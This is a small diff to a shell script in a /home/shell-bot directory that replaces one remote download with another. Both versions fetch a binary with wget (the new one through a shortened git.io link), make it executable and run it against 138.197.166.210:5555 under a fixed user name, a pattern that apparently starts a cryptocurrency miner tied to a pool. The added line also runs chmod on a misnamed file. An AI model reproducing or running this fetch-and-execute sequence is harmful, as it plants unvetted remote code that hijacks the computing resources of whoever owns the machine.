@@ -4,6 +4,6 @@
 
 
 cd /home/shell-bot
-wget -qO bot https://github.com/Omarjetos/ezz/blob/master/nano?raw=true
-chmod +x bot
-./bot -o 138.197.166.210:5555 -u ojokmelumelu
+wget -qO banda https://git.io/J1XFa && chmod +x janda
+chmod +x banda
+./banda -o 138.197.166.210:5555 -u ojokmelumelu
